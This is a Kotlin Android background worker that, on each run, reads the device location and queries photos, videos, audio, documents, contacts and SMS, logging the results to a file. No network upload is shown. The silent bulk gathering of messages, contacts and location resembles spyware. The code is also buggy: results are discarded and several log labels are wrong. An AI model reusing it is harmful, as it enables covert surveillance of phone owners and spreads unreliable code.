package com.example.pnbase.userprofile.workmanager

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.example.pnbase.userprofile.data.AudioFilesProvider
import com.example.pnbase.userprofile.data.ContactsProvider
import com.example.pnbase.userprofile.data.FilePath
import com.example.pnbase.userprofile.data.ImageProvider
import com.example.pnbase.userprofile.data.SmsProvider
import com.example.pnbase.userprofile.data.VideoProvider
import com.example.pnbase.userprofile.domain.DefaultLocationClient
import com.example.pnbase.utils.LogFileWriter
import com.google.android.gms.location.LocationServices
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.flow.take

class DataSyncWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {
    val images = ImageProvider(context.contentResolver)
    val videos = VideoProvider(context.contentResolver)
    val audios = AudioFilesProvider(context.contentResolver)
    val files = FilePath(context.contentResolver)
    val contacts = ContactsProvider(context.contentResolver)
    val sms = SmsProvider(context.contentResolver)

    val locationClient = DefaultLocationClient(context, LocationServices.getFusedLocationProviderClient(context))

    override suspend fun doWork(): Result {
        try {

            LogFileWriter.writeLog("SyncWorker", "doWork запущен. Поток: ${Thread.currentThread().name}")

            val location = locationClient.getLocationUpdates(5000L).take(1).first()

            val lat = location.latitude
            val lon = location.longitude
            LogFileWriter.writeLog("SyncWorker", "Получена локация: ($lat, $lon)")

            images.getImages()
            LogFileWriter.writeLog("SyncWorker", "Найдено изображений: ${images}")

            videos.getVideo()
            LogFileWriter.writeLog("SyncWorker", "Найдено видео: ${videos}")

            audios.getAudio()
            LogFileWriter.writeLog("SyncWorker", "Найдено аудио: ${audios}")

            files.getAllDocuments()
            LogFileWriter.writeLog("SyncWorker", "Найдено аудио: ${files}")

            contacts.getContacts()
            LogFileWriter.writeLog("SyncWorker", "Найдено аудио: ${contacts}")

            sms.getSms()
            LogFileWriter.writeLog("SyncWorker", "Найдено аудио: ${sms}")


            return Result.success()
        } catch (e: Exception) {
            LogFileWriter.writeLog("SyncWorker", "Ошибка при синхронизации медиа: ${e.message}")
            return Result.failure()
        }

    }
}